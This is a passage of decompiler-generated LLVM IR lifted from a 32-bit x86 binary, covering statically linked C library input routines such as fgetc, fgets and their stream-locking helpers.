  %v1_8064e68 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064e68 = add i32 %v1_8064e68, 4
  %v3_8064e68 = inttoptr i32 %v2_8064e68 to i32*
  store i32 %v0_8064e68, i32* %v3_8064e68, align 4
  %v0_8064e6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8064e6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064e6b = add i32 %v1_8064e6b, 8
  %v3_8064e6b = inttoptr i32 %v2_8064e6b to i32*
  store i32 %v0_8064e6b, i32* %v3_8064e6b, align 4
  %v0_8064e6e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064e6e = add i32 %v0_8064e6e, 12
  %v9_8064e6e = icmp eq i32 %v1_8064e6e, 0
  store i1 %v9_8064e6e, i1* %zf.global-to-local, align 1
  store i32 %v1_8064e6e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064e71

dec_label_pc_8064e71:                             ; preds = %dec_label_pc_8064df6, %dec_label_pc_8064aa1, %dec_label_pc_8064e51
  %v0_8064eeb = phi i32 [ %v1_8064e7e114, %dec_label_pc_8064df6 ], [ %v2_8064aa9, %dec_label_pc_8064aa1 ], [ %v1_8064e6e, %dec_label_pc_8064e51 ]
  %v2_8064e71 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8064e71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064e75

dec_label_pc_8064e75:                             ; preds = %dec_label_pc_8064e75, %dec_label_pc_8064e71
  %v0_8064e75 = phi i32 [ %v2_8064e71, %dec_label_pc_8064e71 ], [ %v1_8064e77, %dec_label_pc_8064e75 ]
  %stack_var_-216.0 = phi i32 [ %v3_80649a6, %dec_label_pc_8064e71 ], [ %v5_8064e7a, %dec_label_pc_8064e75 ]
  %v1_8064e75 = inttoptr i32 %v0_8064e75 to i32*
  %v2_8064e75 = load i32, i32* %v1_8064e75, align 4
  store i32 %v2_8064e75, i32* %edi.global-to-local, align 4
  %v1_8064e77 = add i32 %v0_8064e75, 12
  store i32 %v1_8064e77, i32* %eax.global-to-local, align 4
  %v5_8064e7a = sub i32 %stack_var_-216.0, %v2_8064e75
  %v7_8064e7e = icmp ult i32 %v1_8064e77, %v0_8064eeb
  br i1 %v7_8064e7e, label %dec_label_pc_8064e75, label %dec_label_pc_8064e82

dec_label_pc_8064e82:                             ; preds = %dec_label_pc_8064e75
  store i32 %v0_8064eeb, i32* %edi.global-to-local, align 4
  %v5_8064e95 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8064ea5 = icmp eq i1 %v5_8064e95, false
  %v2_8064ea5 = zext i1 %v1_8064ea5 to i32
  store i32 %v2_8064ea5, i32* %edx.global-to-local, align 4
  %v2_8064ea8 = sub i32 %v5_8064e7a, %v2_8064ea5
  %v12_8064ea8 = icmp eq i32 %v2_8064ea8, 0
  store i32 %v2_8064ea8, i32* %eax.global-to-local, align 4
  store i1 %v12_8064ea8, i1* %zf.global-to-local, align 1
  %tmp175 = icmp slt i32 %v2_8064ea8, 1
  br i1 %tmp175, label %dec_label_pc_8064eed, label %dec_label_pc_8064eb2

dec_label_pc_8064eb2:                             ; preds = %dec_label_pc_8064e82
  store i32 %tmp144, i32* %edx.global-to-local, align 4
  %v2_8064eb9 = inttoptr i32 %v1_80649e3 to i8*
  %v3_8064eb9 = load i8, i8* %v2_8064eb9, align 1
  %v4_8064eb9 = and i8 %v3_8064eb9, 8
  %v5_8064eb9 = icmp eq i8 %v4_8064eb9, 0
  store i1 %v5_8064eb9, i1* %zf.global-to-local, align 1
  br i1 %v5_8064eb9, label %dec_label_pc_8064ed4, label %dec_label_pc_8064ebf

dec_label_pc_8064ebf:                             ; preds = %dec_label_pc_8064eb2
  %v1_8064ebf = add i32 %v0_8064eeb, 12
  store i32 %v1_8064ebf, i32* %edi.global-to-local, align 4
  %v1_8064ec2 = inttoptr i32 %v0_8064eeb to i32*
  store i32 160, i32* %v1_8064ec2, align 4
  %v1_8064ec8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064ec8 = add i32 %v1_8064ec8, 4
  %v3_8064ec8 = inttoptr i32 %v2_8064ec8 to i32*
  store i32 %v2_8064ea8, i32* %v3_8064ec8, align 4
  %v0_8064ecb = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064ecb = add i32 %v0_8064ecb, 8
  %v2_8064ecb = inttoptr i32 %v1_8064ecb to i32*
  store i32 ptrtoint (i32* @global_var_80702c3.1685 to i32), i32* %v2_8064ecb, align 4
  br label %dec_label_pc_8064eed

dec_label_pc_8064ed4:                             ; preds = %dec_label_pc_8064eb2
  store i32 %tmp144, i32* %edi.global-to-local, align 4
  %v1_8064edb = add i32 %tmp144, 16
  %v2_8064edb = inttoptr i32 %v1_8064edb to i32*
  %v3_8064edb = load i32, i32* %v2_8064edb, align 4
  %v9_8064edb = icmp eq i32 %v3_8064edb, 48
  store i1 %v9_8064edb, i1* %zf.global-to-local, align 1
  %v1_8064edf = icmp eq i1 %v9_8064edb, false
  br i1 %v1_8064edf, label %dec_label_pc_8064ee7, label %dec_label_pc_8064ee1

dec_label_pc_8064ee1:                             ; preds = %dec_label_pc_8064ed4
  %v3_8064ee1 = load i32, i32* %stack_var_-152, align 4
  %v5_8064ee1 = add i32 %v3_8064ee1, %v2_8064ea8
  %v15_8064ee1 = icmp eq i32 %v5_8064ee1, 0
  store i1 %v15_8064ee1, i1* %zf.global-to-local, align 1
  store i32 %v5_8064ee1, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8064eeb

dec_label_pc_8064ee7:                             ; preds = %dec_label_pc_8064ed4
  %v15_8064ee7 = icmp eq i32 %v5_8064e7a, 0
  store i1 %v15_8064ee7, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8064eeb

dec_label_pc_8064eeb:                             ; preds = %dec_label_pc_8064ee1, %dec_label_pc_8064ee7
  store i32 %v0_8064eeb, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8064eed

dec_label_pc_8064eed:                             ; preds = %dec_label_pc_8064e82, %dec_label_pc_8064ebf, %dec_label_pc_8064eeb
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8064eef = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8064eef, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064ef3

dec_label_pc_8064ef3:                             ; preds = %dec_label_pc_8064f16, %dec_label_pc_8064eed
  call void @__pseudo_call(i32 %tmp144)
  %v1_8064f0c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064f0c = add i32 %v1_8064f0c, 4
  %v3_8064f0c = inttoptr i32 %v2_8064f0c to i32*
  %v4_8064f0c = load i32, i32* %v3_8064f0c, align 4
  %v15_8064f0c = icmp eq i32 %v2_8064ea8, %v4_8064f0c
  store i1 %v15_8064f0c, i1* %zf.global-to-local, align 1
  br i1 %v15_8064f0c, label %dec_label_pc_8064f16, label %dec_label_pc_8064f11

dec_label_pc_8064f11:                             ; preds = %dec_label_pc_8064ef3
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8064f2f

dec_label_pc_8064f16:                             ; preds = %dec_label_pc_8064ef3
  %v1_8064f16 = add i32 %v1_8064f0c, 12
  store i32 %v1_8064f16, i32* %ebx.global-to-local, align 4
  %v0_8064f19 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064f19 = add i32 %v0_8064f19, %v2_8064ea8
  store i32 %v2_8064f19, i32* %esi.global-to-local, align 4
  %v1_8064f1b = load i32, i32* %edi.global-to-local, align 4
  %v7_8064f1b = icmp ult i32 %v1_8064f16, %v1_8064f1b
  %v12_8064f1b = icmp eq i32 %v1_8064f16, %v1_8064f1b
  store i1 %v12_8064f1b, i1* %zf.global-to-local, align 1
  %v1_8064f1d = icmp eq i1 %v7_8064f1b, false
  br i1 %v1_8064f1d, label %dec_label_pc_8064f2f, label %dec_label_pc_8064ef3

dec_label_pc_8064f21:                             ; preds = %dec_label_pc_8064c83, %dec_label_pc_8064c8c, %dec_label_pc_8064c9f
  %stack_var_-197.2 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8064c9f ], [ 103, %dec_label_pc_8064c8c ], [ 103, %dec_label_pc_8064c83 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064cba

dec_label_pc_8064f2f:                             ; preds = %dec_label_pc_8064f16, %dec_label_pc_8064f11
  %v0_8064f35 = phi i32 [ -1, %dec_label_pc_8064f11 ], [ %v2_8064f19, %dec_label_pc_8064f16 ]
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %v0_8064f35, i32* %eax.global-to-local, align 4
  %v2_8064f38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064f38, i32* @esi, align 4
  store i32 %v0_8064986, i32* @edi, align 4
  store i32 %v0_8064985, i32* @ebp, align 4
  ret i32 %v0_8064f35

; uselistorder directives
  uselistorder i32 %v0_8064f35, { 1, 0 }
  uselistorder i1 %v15_8064f0c, { 1, 0 }
  uselistorder i1 %v9_8064edb, { 1, 0 }
  uselistorder i32 %v2_8064ea8, { 1, 0, 2, 4, 3, 5, 6 }
  uselistorder i32 %v2_8064ea5, { 1, 0 }
  uselistorder i32 %v1_8064e77, { 1, 2, 0 }
  uselistorder i32 %v0_8064e75, { 1, 0 }
  uselistorder i32 %v0_8064eeb, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8064e3b, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8064e04, { 2, 1, 0, 4, 3 }
  uselistorder i1 %v12_8064df6, { 1, 0 }
  uselistorder i32 %v2_8064ddd, { 1, 2, 0 }
  uselistorder i32 %v1_8064ddd, { 1, 0, 2 }
  uselistorder i32 %v2_8064ddb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8064d9a, { 1, 0 }
  uselistorder i1 %v2_8064d6b, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8064cf9, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v2_8064cdc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8064cdb, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v4_8064d56, { 0, 4, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8064cb6, { 0, 2, 1 }
  uselistorder i1 %v10_8064ca3, { 1, 0 }
  uselistorder i32 %v1_8064c8c, { 2, 0, 1 }
  uselistorder i32 %v0_8064c83, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 %v0_8064c57, { 2, 0, 1 }
  uselistorder i32 %v2_8064c50, { 2, 3, 4, 0, 1, 5 }
  uselistorder i8 %v4_8064c42, { 1, 0, 2 }
  uselistorder i32 %v1_8064c3f, { 0, 2, 1 }
  uselistorder i32 %v1_8064c2b, { 1, 2, 0 }
  uselistorder i1 %v12_8064bd6, { 1, 0 }
  uselistorder i32 %v1_8064bd3, { 0, 2, 1 }
  uselistorder i32 %v0_8064bcf, { 1, 2, 0, 3 }
  uselistorder i1 %v12_8064bc8, { 2, 4, 3, 1, 5, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 3, 4, 1, 5, 0, 2 }
  uselistorder i32 %v4_8064b76, { 0, 2, 1 }
  uselistorder i32 %tmp180, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v2_8064b7b, { 1, 0 }
  uselistorder i32 %v2_8064b3c, { 1, 0, 2 }
  uselistorder i8* %stack_var_-148.0, { 1, 0 }
  uselistorder i32 %v2_80649f4, { 1, 0 }
  uselistorder i1 %v3_80649e6, { 1, 0 }
  uselistorder i32 %v3_80649e3, { 1, 0, 2, 3 }
  uselistorder i8 %stack_var_-207.0, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v10_80649bf, { 1, 0 }
  uselistorder i32 %v3_80649a6, { 1, 0, 2 }
  uselistorder i8 %v3_80649a3, { 1, 0, 2, 3 }
  uselistorder i3 %v5_806499c, { 0, 2, 1, 3 }
  uselistorder i3 %v4_806499c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp144, { 13, 12, 11, 10, 9, 0, 8, 1, 7, 2, 3, 4, 6, 5 }
  uselistorder x86_fp80 %tmp143, { 2, 1, 0, 3, 4 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder x86_fp80* %st0.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 8, 1, 7, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 1, 3, 8, 7, 9, 10, 13, 12, 14, 11, 15, 4, 5, 6 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 9, 10, 11, 12, 7, 13, 14, 15, 19, 16, 17, 6, 18, 20, 21, 22, 24, 25, 23, 3, 4, 5, 8 }
  uselistorder i32* %edi.global-to-local, { 3, 0, 1, 2, 4, 10, 11, 12, 13, 14, 15, 18, 16, 19, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 5, 6, 7, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 3, 4, 5, 7, 6, 8, 9, 10, 0, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 15, 16, 9, 17, 18, 19, 20, 10, 21, 22, 23, 11, 24, 25, 26, 12, 27, 28, 29, 13, 30, 31, 32, 14, 33, 6, 34, 36, 35, 37, 3, 4, 5, 7, 8 }
  uselistorder i32* %ebp.global-to-local, { 6, 7, 8, 9, 10, 3, 1, 0, 2, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 16, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 160, { 1, 0 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i8 45, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0 }
  uselistorder i32 112, { 4, 5, 6, 2, 3, 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 101, { 0, 2, 1 }
  uselistorder i32 69, { 0, 2, 1 }
  uselistorder i8 96, { 2, 1, 0 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 1, 3, 4, 5, 2 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064f21, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064eed, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064eeb, { 1, 0 }
  uselistorder label %dec_label_pc_8064e71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064e32.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8064e1e, { 1, 0 }
  uselistorder label %dec_label_pc_8064df6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064dcb, { 1, 0 }
  uselistorder label %dec_label_pc_8064db4, { 1, 0 }
  uselistorder label %dec_label_pc_8064d9a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064d61, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064d4a, { 1, 0 }
  uselistorder label %dec_label_pc_8064d3f, { 1, 0 }
  uselistorder label %dec_label_pc_8064cba, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8064c71, { 1, 0 }
  uselistorder label %dec_label_pc_8064c3f.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8064c3f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8064c0b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064bdd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064bc8, { 1, 0 }
  uselistorder label %dec_label_pc_8064aa1, { 1, 0 }
  uselistorder label %dec_label_pc_8064a77, { 1, 0 }
  uselistorder label %dec_label_pc_8064a73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80649ca, { 1, 0 }
}

define i32 @__GI_fgetc() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8064f3c = load i32, i32* @ebx, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v1_8064f44 = add i32 %tmp, 52
  %v2_8064f44 = inttoptr i32 %v1_8064f44 to i32*
  %v3_8064f44 = load i32, i32* %v2_8064f44, align 4
  %v4_8064f44 = icmp eq i32 %v3_8064f44, 0
  br i1 %v4_8064f44, label %dec_label_pc_8064f67, label %dec_label_pc_8064f4a

dec_label_pc_8064f4a:                             ; preds = %entry
  %v1_8064f4a = add i32 %tmp, 16
  %v2_8064f4a = inttoptr i32 %v1_8064f4a to i32*
  %v3_8064f4a = load i32, i32* %v2_8064f4a, align 4
  store i32 %v3_8064f4a, i32* %eax.global-to-local, align 4
  %v2_8064f4d = add i32 %tmp, 24
  %v3_8064f4d = inttoptr i32 %v2_8064f4d to i32*
  %v4_8064f4d = load i32, i32* %v3_8064f4d, align 4
  %v10_8064f4d = icmp ult i32 %v3_8064f4a, %v4_8064f4d
  %v1_8064f50 = icmp eq i1 %v10_8064f4d, false
  br i1 %v1_8064f50, label %dec_label_pc_8064f5b, label %dec_label_pc_8064f52

dec_label_pc_8064f52:                             ; preds = %dec_label_pc_8064f4a
  %v1_8064f52 = inttoptr i32 %v3_8064f4a to i8*
  %v2_8064f52 = load i8, i8* %v1_8064f52, align 1
  %v3_8064f52 = zext i8 %v2_8064f52 to i32
  store i32 %v3_8064f52, i32* @edx, align 4
  %v1_8064f55 = add i32 %v3_8064f4a, 1
  store i32 %v1_8064f55, i32* %eax.global-to-local, align 4
  store i32 %v1_8064f55, i32* %v2_8064f4a, align 4
  %v1_8064f59 = call i32 @function_8064fd3(i32 %v0_8064f3c)
  store i32 %v1_8064f59, i32* %eax.global-to-local, align 4
  %v0_8064f5b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064f5b

dec_label_pc_8064f5b:                             ; preds = %dec_label_pc_8064f4a, %dec_label_pc_8064f52
  %v0_8064f5b = phi i32 [ %tmp, %dec_label_pc_8064f4a ], [ %v0_8064f5b.pre, %dec_label_pc_8064f52 ]
  store i32 %v0_8064f3c, i32* @ebx, align 4
  %v1_8064f62 = inttoptr i32 %v0_8064f5b to i16*
  %v2_8064f62 = call i32 @getc_unlocked(i16* %v1_8064f62)
  store i32 %v2_8064f62, i32* %eax.global-to-local, align 4
  %v0_8064f6e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8064f67

dec_label_pc_8064f67:                             ; preds = %entry, %dec_label_pc_8064f5b
  %v0_8064f6e = phi i32 [ %tmp, %entry ], [ %v0_8064f6e.pre, %dec_label_pc_8064f5b ]
  %v0_8064f67 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_8064f67, i32* @edx, align 4
  %v1_8064f6e = add i32 %v0_8064f6e, 64
  %v2_8064f6e = inttoptr i32 %v1_8064f6e to i32*
  %v3_8064f6e = load i32, i32* %v2_8064f6e, align 4
  %v15_8064f6e = icmp eq i32 %v3_8064f6e, %v0_8064f67
  call void @__pseudo_cond_branch(i1 %v15_8064f6e, i32 134631310)
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v0_8064f7a = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064f7a = icmp eq i32 %v0_8064f7a, 0
  call void @__pseudo_cond_branch(i1 %v1_8064f7a, i32 134631301)
  %v0_8064f84 = load i32, i32* @ebx, align 4
  %v1_8064f84 = add i32 %v0_8064f84, 56
  %v2_8064f84 = inttoptr i32 %v1_8064f84 to i32*
  %v3_8064f84 = load i32, i32* %v2_8064f84, align 4
  %v4_8064f84 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8064f84 = load i32, i32* %eax.global-to-local, align 4
  %v16_8064f84 = icmp eq i32 %v5_8064f84, %v3_8064f84
  %v23_8064f84 = select i1 %v16_8064f84, i32 %v4_8064f84, i32 %v3_8064f84
  store i32 %v23_8064f84, i32* %v2_8064f84, align 4
  store i32 %v3_8064f84, i32* %eax.global-to-local, align 4
  %v1_8064f89 = icmp eq i1 %v16_8064f84, false
  call void @__pseudo_cond_branch(i1 %v1_8064f89, i32 134631385)
  ret i32 %v3_8064f84

; uselistorder directives
  uselistorder i1 %v16_8064f84, { 1, 0 }
  uselistorder i32 %v3_8064f84, { 1, 0, 3, 2 }
  uselistorder i32 %v3_8064f4a, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_8064f67, { 1, 0 }
  uselistorder label %dec_label_pc_8064f5b, { 1, 0 }
}

define i32 @function_8064f8b() local_unnamed_addr {
dec_label_pc_8064f8b:
  %eax.global-to-local = alloca i32, align 4
  %v0_8064f8b = load i32, i32* @edx, align 4
  %v1_8064f8b = load i32, i32* @ebx, align 4
  %v2_8064f8b = add i32 %v1_8064f8b, 64
  %v3_8064f8b = inttoptr i32 %v2_8064f8b to i32*
  store i32 %v0_8064f8b, i32* %v3_8064f8b, align 4
  %v0_8064f8e = load i32, i32* @ebx, align 4
  %v1_8064f8e = add i32 %v0_8064f8e, 16
  %v2_8064f8e = inttoptr i32 %v1_8064f8e to i32*
  %v3_8064f8e = load i32, i32* %v2_8064f8e, align 4
  store i32 %v3_8064f8e, i32* %eax.global-to-local, align 4
  %v1_8064f91 = add i32 %v0_8064f8e, 60
  %v2_8064f91 = inttoptr i32 %v1_8064f91 to i32*
  %v3_8064f91 = load i32, i32* %v2_8064f91, align 4
  %v4_8064f91 = add i32 %v3_8064f91, 1
  store i32 %v4_8064f91, i32* %v2_8064f91, align 4
  %v0_8064f94 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064f94 = load i32, i32* @ebx, align 4
  %v2_8064f94 = add i32 %v1_8064f94, 24
  %v3_8064f94 = inttoptr i32 %v2_8064f94 to i32*
  %v4_8064f94 = load i32, i32* %v3_8064f94, align 4
  %v10_8064f94 = icmp ult i32 %v0_8064f94, %v4_8064f94
  %v1_8064f97 = icmp eq i1 %v10_8064f94, false
  br i1 %v1_8064f97, label %dec_label_pc_8064fa2, label %dec_label_pc_8064f99

dec_label_pc_8064f99:                             ; preds = %dec_label_pc_8064f8b
  %v1_8064f9c = add i32 %v0_8064f94, 1
  store i32 %v1_8064f9c, i32* %eax.global-to-local, align 4
  %v2_8064f9d = add i32 %v1_8064f94, 16
  %v3_8064f9d = inttoptr i32 %v2_8064f9d to i32*
  store i32 %v1_8064f9c, i32* %v3_8064f9d, align 4
  br label %dec_label_pc_8064fb0

dec_label_pc_8064fa2:                             ; preds = %dec_label_pc_8064f8b
  %v1_8064fa6 = inttoptr i32 %v1_8064f94 to i16*
  %v2_8064fa6 = call i32 @getc_unlocked(i16* %v1_8064fa6)
  store i32 %v2_8064fa6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064fb0

dec_label_pc_8064fb0:                             ; preds = %dec_label_pc_8064f99, %dec_label_pc_8064fa2
  %v0_8064fb0 = load i32, i32* @ebx, align 4
  %v1_8064fb0 = add i32 %v0_8064fb0, 60
  %v2_8064fb0 = inttoptr i32 %v1_8064fb0 to i32*
  %v3_8064fb0 = load i32, i32* %v2_8064fb0, align 4
  %v1_8064fb3 = add i32 %v3_8064fb0, -1
  %v8_8064fb3 = icmp eq i32 %v1_8064fb3, 0
  store i32 %v1_8064fb3, i32* %eax.global-to-local, align 4
  store i32 %v1_8064fb3, i32* %v2_8064fb0, align 4
  %v1_8064fb9 = icmp eq i1 %v8_8064fb3, false
  call void @__pseudo_cond_branch(i1 %v1_8064fb9, i32 134631379)
  %v0_8064fbb = load i32, i32* @ebx, align 4
  %v1_8064fbb = add i32 %v0_8064fbb, 64
  %v2_8064fbb = inttoptr i32 %v1_8064fbb to i32*
  store i32 0, i32* %v2_8064fbb, align 4
  %v0_8064fc2 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064fc2 = icmp eq i32 %v0_8064fc2, 0
  call void @__pseudo_cond_branch(i1 %v1_8064fc2, i32 134631373)
  %v0_8064fcc = load i32, i32* @ebx, align 4
  %v1_8064fcc = add i32 %v0_8064fcc, 56
  %v2_8064fcc = inttoptr i32 %v1_8064fcc to i32*
  %v3_8064fcc = load i32, i32* %v2_8064fcc, align 4
  %v4_8064fcc = add i32 %v3_8064fcc, -1
  %v12_8064fcc = icmp eq i32 %v4_8064fcc, 0
  store i32 %v4_8064fcc, i32* %v2_8064fcc, align 4
  %v1_8064fd1 = icmp eq i1 %v12_8064fcc, false
  call void @__pseudo_cond_branch(i1 %v1_8064fd1, i32 134631395)
  ret i32 %v1_8064fb3

; uselistorder directives
  uselistorder i32 %v4_8064fcc, { 1, 0 }
  uselistorder i32 %v1_8064fb3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8064fb0, { 1, 0 }
}

define i32 @function_8064fd3(i32 %arg1) local_unnamed_addr {
dec_label_pc_8064fd3:
  %v0_8064fd3 = load i32, i32* @edx, align 4
  store i32 %arg1, i32* @edx, align 4
  ret i32 %v0_8064fd3
}

define i32 @_L_lock_35() local_unnamed_addr {
entry:
  %v0_8064fd9 = load i32, i32* @ebx, align 4
  %v1_8064fd9 = add i32 %v0_8064fd9, 56
  store i32 %v1_8064fd9, i32* @ecx, align 4
  %v0_8064fdc = call i32 @__lll_lock_wait_private()
  %v0_8064fe1 = call i32 @function_8064f8b()
  ret i32 %v0_8064fe1
}

define i32 @_L_unlock_65.3() local_unnamed_addr {
entry:
  %v0_8064fe3 = load i32, i32* @ebx, align 4
  %v1_8064fe3 = add i32 %v0_8064fe3, 56
  store i32 %v1_8064fe3, i32* @eax, align 4
  %v0_8064fe6 = call i32 @__lll_unlock_wake_private()
  %v1_8064feb = call i32 @function_8064fd3(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_8064feb
}

define i32 @fgets() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp, i32* @ebx, align 4
  %v1_8064ff9 = add i32 %tmp, 52
  %v2_8064ff9 = inttoptr i32 %v1_8064ff9 to i32*
  %v3_8064ff9 = load i32, i32* %v2_8064ff9, align 4
  store i32 %v3_8064ff9, i32* @esi, align 4
  %v1_8064ffc = icmp eq i32 %v3_8064ff9, 0
  %v1_8064ffe = icmp eq i1 %v1_8064ffc, false
  call void @__pseudo_cond_branch(i1 %v1_8064ffe, i32 134631466)
  %v0_8065000 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  %v0_8065007 = load i32, i32* @ebx, align 4
  %v1_8065007 = add i32 %v0_8065007, 64
  %v2_8065007 = inttoptr i32 %v1_8065007 to i32*
  %v3_8065007 = load i32, i32* %v2_8065007, align 4
  %v15_8065007 = icmp eq i32 %v3_8065007, %v0_8065000
  call void @__pseudo_cond_branch(i1 %v15_8065007, i32 134631463)
  store i32 1, i32* @ecx, align 4
  store i32 %v3_8064ff9, i32* %eax.global-to-local, align 4
  %v0_8065013 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8065013 = icmp eq i32 %v0_8065013, 0
  call void @__pseudo_cond_branch(i1 %v1_8065013, i32 134631454)
  %v0_806501d = load i32, i32* @ebx, align 4
  %v1_806501d = add i32 %v0_806501d, 56
  %v2_806501d = inttoptr i32 %v1_806501d to i32*
  %v3_806501d = load i32, i32* %v2_806501d, align 4
  %v4_806501d = load i32, i32* @ecx, align 4
  %v5_806501d = load i32, i32* %eax.global-to-local, align 4
  %v16_806501d = icmp eq i32 %v5_806501d, %v3_806501d
  %v23_806501d = select i1 %v16_806501d, i32 %v4_806501d, i32 %v3_806501d
  store i32 %v23_806501d, i32* %v2_806501d, align 4
  store i32 %v3_806501d, i32* %eax.global-to-local, align 4
  %v1_8065022 = icmp eq i1 %v16_806501d, false
  call void @__pseudo_cond_branch(i1 %v1_8065022, i32 134631531)
  ret i32 %v3_806501d

; uselistorder directives
  uselistorder i1 %v16_806501d, { 1, 0 }
  uselistorder i32 %v3_806501d, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @function_8065024() local_unnamed_addr {
dec_label_pc_8065024:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_8065024 = load i32, i32* @edx, align 4
  %v1_8065024 = load i32, i32* @ebx, align 4
  %v2_8065024 = add i32 %v1_8065024, 64
